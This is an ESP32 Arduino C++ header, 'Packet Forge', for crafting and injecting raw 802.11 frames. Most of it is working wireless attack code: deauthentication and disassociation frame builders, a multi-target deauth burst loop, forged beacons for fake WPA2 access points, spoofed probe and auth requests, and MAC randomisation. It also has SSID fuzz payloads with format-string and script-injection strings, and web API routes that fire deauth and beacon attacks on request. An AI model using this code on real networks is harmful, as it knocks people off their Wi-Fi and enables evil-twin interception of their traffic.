#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>
#include <stdint.h>

// ── Packet Forge ──────────────────────────────────────────────────────────────
//
// High-level 802.11 frame construction toolkit. Wraps frame_builder.h
// primitives with named presets, batch transmit, and injection scheduling.

// ── Forward declarations (from frame_builder.h if included) ──────────────────
#ifndef FB_TYPE_MGMT
#define FB_TYPE_MGMT  0
#define FB_TYPE_CTRL  1
#define FB_TYPE_DATA  2
#define FB_STYPE_DEAUTH   12
#define FB_STYPE_DISASSOC 10
#define FB_STYPE_PROBE_REQ 4
#define FB_STYPE_BEACON    8
#define FB_STYPE_AUTH      11
#define FB_STYPE_ASSOC_REQ 0
#endif

// ── Transmit result ───────────────────────────────────────────────────────────
enum PfResult : uint8_t {
  PF_OK          = 0,
  PF_ERR_BUILD   = 1,
  PF_ERR_TX      = 2,
  PF_ERR_BUSY    = 3,
  PF_ERR_PARAM   = 4,
};

static const char* pf_result_name(PfResult r) {
  switch(r){
    case PF_OK:        return "OK";
    case PF_ERR_BUILD: return "Build error";
    case PF_ERR_TX:    return "TX error";
    case PF_ERR_BUSY:  return "Busy";
    case PF_ERR_PARAM: return "Bad parameter";
    default:           return "Unknown";
  }
}

// ── Transmit interface ────────────────────────────────────────────────────────
enum PfIface : uint8_t {
  PF_IFACE_AP  = 0,
  PF_IFACE_STA = 1,
};

// ── Packet job ────────────────────────────────────────────────────────────────
struct PfJob {
  uint8_t  buf[512];
  uint16_t len;
  uint8_t  iface;      // PfIface
  uint32_t delay_ms;   // delay before this packet
  uint32_t repeat;     // 0=once, N=N times
  uint32_t interval_ms;// interval between repeats
};

#define PF_MAX_JOBS 16

// ── Job queue ─────────────────────────────────────────────────────────────────
struct PfQueue {
  PfJob    jobs[PF_MAX_JOBS];
  uint8_t  head;
  uint8_t  tail;
  uint8_t  count;
};

static PfQueue g_pfq = {};

// ── Enqueue job ───────────────────────────────────────────────────────────────
static bool pf_enqueue(const uint8_t* buf, uint16_t len, PfIface iface,
                        uint32_t delay_ms, uint32_t repeat, uint32_t interval_ms) {
  if(g_pfq.count>=PF_MAX_JOBS) return false;
  PfJob* j=&g_pfq.jobs[g_pfq.tail];
  if(len>512) len=512;
  memcpy(j->buf,buf,len);
  j->len=len;
  j->iface=(uint8_t)iface;
  j->delay_ms=delay_ms;
  j->repeat=repeat;
  j->interval_ms=interval_ms;
  g_pfq.tail=(g_pfq.tail+1)%PF_MAX_JOBS;
  g_pfq.count++;
  return true;
}

// ── Transmit one frame ────────────────────────────────────────────────────────
static PfResult pf_tx(const uint8_t* buf, uint16_t len, PfIface iface) {
  if(!buf||!len) return PF_ERR_PARAM;
  wifi_interface_t wif = (iface==PF_IFACE_STA) ? WIFI_IF_STA : WIFI_IF_AP;
  esp_err_t err = esp_wifi_80211_tx(wif, buf, len, false);
  return (err==ESP_OK) ? PF_OK : PF_ERR_TX;
}

// ── Misc helpers ──────────────────────────────────────────────────────────────
static uint16_t pf_seq() {
  extern uint16_t g_seq;
  uint16_t s=g_seq;
  g_seq=(g_seq+1)&0x0FFF;
  return s<<4;
}

// ── Broadcast MAC ─────────────────────────────────────────────────────────────
static const uint8_t PF_BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// ── Build + send deauth ───────────────────────────────────────────────────────
static PfResult pf_deauth(const uint8_t dst[6], const uint8_t src[6],
                            const uint8_t bssid[6], uint16_t reason,
                            PfIface iface) {
  uint8_t buf[32];
  // Frame control: deauth
  buf[0]=0xC0; buf[1]=0x00;
  // Duration
  buf[2]=0x00; buf[3]=0x00;
  // DA, SA, BSSID
  memcpy(buf+4,  dst,   6);
  memcpy(buf+10, src,   6);
  memcpy(buf+16, bssid, 6);
  // Seq ctrl
  uint16_t seq=pf_seq();
  buf[22]=(uint8_t)(seq&0xFF);
  buf[23]=(uint8_t)(seq>>8);
  // Reason code
  buf[24]=(uint8_t)(reason&0xFF);
  buf[25]=(uint8_t)(reason>>8);
  return pf_tx(buf,26,iface);
}

// ── Build + send disassoc ─────────────────────────────────────────────────────
static PfResult pf_disassoc(const uint8_t dst[6], const uint8_t src[6],
                              const uint8_t bssid[6], uint16_t reason,
                              PfIface iface) {
  uint8_t buf[32];
  buf[0]=0xA0; buf[1]=0x00;
  buf[2]=0x00; buf[3]=0x00;
  memcpy(buf+4,  dst,   6);
  memcpy(buf+10, src,   6);
  memcpy(buf+16, bssid, 6);
  uint16_t seq=pf_seq();
  buf[22]=(uint8_t)(seq&0xFF);
  buf[23]=(uint8_t)(seq>>8);
  buf[24]=(uint8_t)(reason&0xFF);
  buf[25]=(uint8_t)(reason>>8);
  return pf_tx(buf,26,iface);
}

// ── Build + send probe request ────────────────────────────────────────────────
static PfResult pf_probe_req(const uint8_t src[6], const char* ssid,
                               PfIface iface) {
  uint8_t buf[128];
  buf[0]=0x40; buf[1]=0x00;
  buf[2]=0x00; buf[3]=0x00;
  memcpy(buf+4,  PF_BCAST, 6);  // DA = broadcast
  memcpy(buf+10, src, 6);
  memcpy(buf+16, PF_BCAST, 6);  // BSSID = broadcast
  uint16_t seq=pf_seq();
  buf[22]=(uint8_t)(seq&0xFF);
  buf[23]=(uint8_t)(seq>>8);
  uint8_t ssid_len=ssid?strnlen(ssid,32):0;
  buf[24]=0; buf[25]=ssid_len;
  if(ssid_len) memcpy(buf+26,ssid,ssid_len);
  uint16_t total=26+ssid_len;
  // Rates IE
  buf[total++]=1; buf[total++]=8;
  static const uint8_t rates[]={0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  memcpy(buf+total,rates,8); total+=8;
  return pf_tx(buf,total,iface);
}

// ── Build + send auth request ─────────────────────────────────────────────────
static PfResult pf_auth_req(const uint8_t dst[6], const uint8_t src[6],
                              const uint8_t bssid[6], uint16_t auth_alg,
                              PfIface iface) {
  uint8_t buf[48];
  buf[0]=0xB0; buf[1]=0x00;
  buf[2]=0x00; buf[3]=0x00;
  memcpy(buf+4,  dst,   6);
  memcpy(buf+10, src,   6);
  memcpy(buf+16, bssid, 6);
  uint16_t seq=pf_seq();
  buf[22]=(uint8_t)(seq&0xFF);
  buf[23]=(uint8_t)(seq>>8);
  // Auth algo
  buf[24]=(uint8_t)(auth_alg&0xFF); buf[25]=(uint8_t)(auth_alg>>8);
  // Auth seq (1)
  buf[26]=0x01; buf[27]=0x00;
  // Status (0 = success)
  buf[28]=0x00; buf[29]=0x00;
  return pf_tx(buf,30,iface);
}

// ── Build + send null data ────────────────────────────────────────────────────
static PfResult pf_null_data(const uint8_t dst[6], const uint8_t src[6],
                               const uint8_t bssid[6], bool pwr_save,
                               PfIface iface) {
  uint8_t buf[32];
  uint16_t fc=0x0048; // Null, FromDS=0, ToDS=1
  if(pwr_save) fc|=0x1000;
  buf[0]=(uint8_t)(fc&0xFF); buf[1]=(uint8_t)(fc>>8);
  buf[2]=0x00; buf[3]=0x00;
  memcpy(buf+4,  bssid, 6);
  memcpy(buf+10, src,   6);
  memcpy(buf+16, dst,   6);
  uint16_t seq=pf_seq();
  buf[22]=(uint8_t)(seq&0xFF);
  buf[23]=(uint8_t)(seq>>8);
  return pf_tx(buf,24,iface);
}

// ── Multi-target deauth burst ─────────────────────────────────────────────────
struct PfDeauthTarget {
  uint8_t dst[6];
  uint8_t src[6];
  uint8_t bssid[6];
};

static uint32_t pf_deauth_burst(const PfDeauthTarget* targets, uint8_t count,
                                  uint16_t reason, uint8_t repeats,
                                  PfIface iface) {
  uint32_t sent=0;
  for(uint8_t r=0;r<repeats;r++){
    for(uint8_t i=0;i<count;i++){
      if(pf_deauth(targets[i].dst, targets[i].src,
                    targets[i].bssid, reason, iface)==PF_OK) sent++;
      if(pf_disassoc(targets[i].dst, targets[i].src,
                      targets[i].bssid, reason, iface)==PF_OK) sent++;
    }
  }
  return sent;
}

// ── Fake AP beacon ────────────────────────────────────────────────────────────
static PfResult pf_beacon(const uint8_t bssid[6], const char* ssid,
                            uint8_t channel, bool wpa2, PfIface iface) {
  uint8_t buf[256];
  buf[0]=0x80; buf[1]=0x00;
  buf[2]=0x00; buf[3]=0x00;
  memcpy(buf+4,  PF_BCAST, 6);
  memcpy(buf+10, bssid, 6);
  memcpy(buf+16, bssid, 6);
  uint16_t seq=pf_seq();
  buf[22]=(uint8_t)(seq&0xFF);
  buf[23]=(uint8_t)(seq>>8);
  // Timestamp (0)
  memset(buf+24, 0, 8);
  // Interval = 100 TU
  buf[32]=0x64; buf[33]=0x00;
  // Capability: ESS + Privacy if WPA2
  uint16_t cap=0x0001; if(wpa2) cap|=0x0010;
  buf[34]=(uint8_t)(cap&0xFF); buf[35]=(uint8_t)(cap>>8);
  uint8_t pos=36;
  // SSID IE
  uint8_t ssid_len=ssid?strnlen(ssid,32):0;
  buf[pos++]=0; buf[pos++]=ssid_len;
  if(ssid_len) { memcpy(buf+pos,ssid,ssid_len); pos+=ssid_len; }
  // Rates IE
  buf[pos++]=1; buf[pos++]=8;
  static const uint8_t rates[]={0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
  memcpy(buf+pos,rates,8); pos+=8;
  // DS Param IE
  buf[pos++]=3; buf[pos++]=1; buf[pos++]=channel;
  // RSN IE if WPA2
  if(wpa2){
    static const uint8_t rsn[]={
      0x30,0x14,0x01,0x00,                        // tag, len, ver
      0x00,0x0F,0xAC,0x04,                        // group CCMP
      0x01,0x00,0x00,0x0F,0xAC,0x04,              // pairwise CCMP
      0x01,0x00,0x00,0x0F,0xAC,0x02,              // AKM PSK
      0x0C,0x00                                    // RSN caps MFP capable
    };
    memcpy(buf+pos,rsn,sizeof(rsn)); pos+=sizeof(rsn);
  }
  return pf_tx(buf,pos,iface);
}

// ── Random MAC generator ──────────────────────────────────────────────────────
static void pf_random_mac(uint8_t mac[6]) {
  for(int i=0;i<6;i++) mac[i]=(uint8_t)(esp_random()&0xFF);
  mac[0]&=0xFE; // clear multicast bit
  mac[0]|=0x02; // set locally administered
}

// ── Random private MAC (not locally administered) ─────────────────────────────
static void pf_random_mac_global(uint8_t mac[6]) {
  for(int i=0;i<6;i++) mac[i]=(uint8_t)(esp_random()&0xFF);
  mac[0]&=0xFC; // clear multicast and locally-administered bits
}

// ── Stats ─────────────────────────────────────────────────────────────────────
static uint32_t g_pf_tx_ok   = 0;
static uint32_t g_pf_tx_fail = 0;

static PfResult pf_tx_counted(const uint8_t* buf, uint16_t len, PfIface iface) {
  PfResult r=pf_tx(buf,len,iface);
  if(r==PF_OK) g_pf_tx_ok++; else g_pf_tx_fail++;
  return r;
}

// ── Fuzzing helpers ───────────────────────────────────────────────────────────
// Generate SSID with specific fuzz type
enum PfFuzzType : uint8_t {
  PF_FUZZ_LONG      = 0,  // 32-byte SSID
  PF_FUZZ_NULL      = 1,  // null bytes in SSID
  PF_FUZZ_EMOJI     = 2,  // 4-byte emoji chars
  PF_FUZZ_FMT       = 3,  // printf-style %s%n%x
  PF_FUZZ_CTRL      = 4,  // control chars 0x01-0x1F
  PF_FUZZ_UNICODE   = 5,  // multi-byte UTF-8
  PF_FUZZ_INJECT    = 6,  // SQL/HTML injection
  PF_FUZZ_REPEAT    = 7,  // repeat char
};

static uint8_t pf_fuzz_ssid(PfFuzzType t, uint8_t* out, uint8_t max_len) {
  switch(t){
    case PF_FUZZ_LONG:{
      memset(out,'A',32); return 32;
    }
    case PF_FUZZ_NULL:{
      memset(out,0,16); out[0]='A'; out[8]='B'; return 16;
    }
    case PF_FUZZ_EMOJI:{
      // 😈 = F0 9F 98 88
      static const uint8_t em[]={0xF0,0x9F,0x98,0x88};
      uint8_t n=0;
      while(n+4<=max_len){memcpy(out+n,em,4);n+=4;}
      return n;
    }
    case PF_FUZZ_FMT:{
      static const char* s="%s%s%n%x%p%d";
      uint8_t n=strnlen(s,max_len);
      memcpy(out,s,n); return n;
    }
    case PF_FUZZ_CTRL:{
      for(uint8_t i=0;i<16&&i<max_len;i++) out[i]=i+1;
      return 16>max_len?max_len:16;
    }
    case PF_FUZZ_UNICODE:{
      // UTF-8 2-byte chars
      uint8_t n=0;
      while(n+2<=max_len&&n<16){out[n++]=0xC3;out[n++]=0xA9;} // é
      return n;
    }
    case PF_FUZZ_INJECT:{
      static const char* s="<script>alert(1)</script>";
      uint8_t n=strnlen(s,max_len);
      memcpy(out,s,n); return n;
    }
    case PF_FUZZ_REPEAT:{
      memset(out,0xAA,max_len); return max_len;
    }
    default: return 0;
  }
}

// ── Incremental channel scanner ───────────────────────────────────────────────
struct PfChannelScan {
  uint8_t  channels[14];
  uint8_t  chan_count;
  uint8_t  current_idx;
  uint32_t dwell_ms;
  uint32_t last_hop_ms;
  bool     active;
};

static PfChannelScan g_pf_scan = {};

static void pf_scan_init(uint32_t dwell_ms) {
  g_pf_scan.chan_count=0;
  for(uint8_t i=1;i<=13;i++) g_pf_scan.channels[g_pf_scan.chan_count++]=i;
  g_pf_scan.dwell_ms=dwell_ms>0?dwell_ms:100;
  g_pf_scan.current_idx=0;
  g_pf_scan.last_hop_ms=millis();
  g_pf_scan.active=true;
}

static void pf_scan_tick() {
  if(!g_pf_scan.active) return;
  uint32_t now=millis();
  if(now-g_pf_scan.last_hop_ms<g_pf_scan.dwell_ms) return;
  g_pf_scan.last_hop_ms=now;
  g_pf_scan.current_idx=(g_pf_scan.current_idx+1)%g_pf_scan.chan_count;
  esp_wifi_set_channel(g_pf_scan.channels[g_pf_scan.current_idx],WIFI_SECOND_CHAN_NONE);
}

// ── Stats JSON ────────────────────────────────────────────────────────────────
static String pf_stats_json() {
  char buf[128];
  snprintf(buf,sizeof(buf),
    "{\"tx_ok\":%u,\"tx_fail\":%u,\"jobs_pending\":%u}",
    (unsigned)g_pf_tx_ok, (unsigned)g_pf_tx_fail,
    (unsigned)g_pfq.count);
  return String(buf);
}

// ── HTTP routes ───────────────────────────────────────────────────────────────
static void pf_routes() {
  extern WebServer server;

  server.on("/api/pf/stats",HTTP_GET,[](){
    server.send(200,"application/json",pf_stats_json());
  });

  server.on("/api/pf/deauth",HTTP_POST,[](){
    if(!server.hasArg("dst")||!server.hasArg("src")||!server.hasArg("bssid")){
      server.send(400,"application/json","{\"error\":\"dst/src/bssid required\"}");
      return;
    }
    uint8_t dst[6],src[6],bssid[6];
    unsigned d[6],s[6],b[6];
    if(sscanf(server.arg("dst").c_str(),"%x:%x:%x:%x:%x:%x",&d[0],&d[1],&d[2],&d[3],&d[4],&d[5])!=6||
       sscanf(server.arg("src").c_str(),"%x:%x:%x:%x:%x:%x",&s[0],&s[1],&s[2],&s[3],&s[4],&s[5])!=6||
       sscanf(server.arg("bssid").c_str(),"%x:%x:%x:%x:%x:%x",&b[0],&b[1],&b[2],&b[3],&b[4],&b[5])!=6){
      server.send(400,"application/json","{\"error\":\"invalid MAC\"}");
      return;
    }
    for(int i=0;i<6;i++){dst[i]=(uint8_t)d[i];src[i]=(uint8_t)s[i];bssid[i]=(uint8_t)b[i];}
    uint16_t reason=server.hasArg("reason")?server.arg("reason").toInt():3;
    PfResult r=pf_deauth(dst,src,bssid,reason,PF_IFACE_AP);
    server.send(200,"application/json",r==PF_OK?"{\"ok\":1}":"{\"error\":\"tx failed\"}");
  });

  server.on("/api/pf/probe",HTTP_POST,[](){
    uint8_t src[6];
    pf_random_mac(src);
    const char* ssid=server.hasArg("ssid")?server.arg("ssid").c_str():nullptr;
    PfResult r=pf_probe_req(src,ssid,PF_IFACE_AP);
    server.send(200,"application/json",r==PF_OK?"{\"ok\":1}":"{\"error\":\"tx failed\"}");
  });

  server.on("/api/pf/beacon",HTTP_POST,[](){
    uint8_t bssid[6]; pf_random_mac(bssid);
    const char* ssid=server.hasArg("ssid")?server.arg("ssid").c_str():"TestAP";
    uint8_t ch=server.hasArg("ch")?server.arg("ch").toInt():6;
    bool wpa2=!server.hasArg("wpa2")||server.arg("wpa2")!="0";
    PfResult r=pf_beacon(bssid,ssid,ch,wpa2,PF_IFACE_AP);
    server.send(200,"application/json",r==PF_OK?"{\"ok\":1}":"{\"error\":\"tx failed\"}");
  });
}
